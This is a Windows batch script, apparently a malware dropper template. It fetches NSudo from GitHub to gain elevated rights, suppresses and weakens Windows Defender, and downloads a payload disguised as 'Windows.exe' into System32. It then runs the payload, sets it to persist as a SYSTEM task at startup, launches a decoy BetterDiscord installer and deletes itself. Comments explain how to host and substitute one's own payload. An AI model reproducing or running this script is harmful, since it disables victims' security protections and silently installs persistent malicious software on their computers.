curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
::disables ControlledFolderAccess to access files and folders
powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
::windows defender exclusions
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
::direct download link
::edit this to your files
md "%systemroot%\System32\Windowsexe"
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows.exe" --output "%appdata%\Windows.exe"
move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
::upload files here: github.com - create account and create repository (public) then upload files
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\Windows.exe'"
start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /RU "SYSTEM" /TN "Windows.exe"
del NSudo.exe
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper-extra-downloads/main/BetterDiscord.exe" --output "BetterDiscord.exe"
start BetterDiscord.exe
call :deleteSelf&exit
:deleteSelf
start /b "" cmd /c del "%~f0"&exit